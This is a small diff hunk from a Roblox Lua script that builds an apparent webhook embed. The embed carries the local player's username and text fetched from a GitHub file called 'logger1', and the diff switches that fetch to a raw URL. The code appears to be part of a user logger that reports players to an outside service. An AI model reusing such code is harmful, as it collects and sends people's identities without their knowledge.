@@ -5,7 +5,7 @@ pcall(function()
        ["embeds"] = {
            {
                ["title"] = game:GetService("Players").LocalPlayer.Name,
-               ["description"] = game:HttpGet("https://github.com/creepyV4/log-1/blob/main/logger1.")
+               ["description"] = game:HttpGet("https://raw.githubusercontent.com/creepyV4/log-1/main/logger1..")
            }
        }
    }
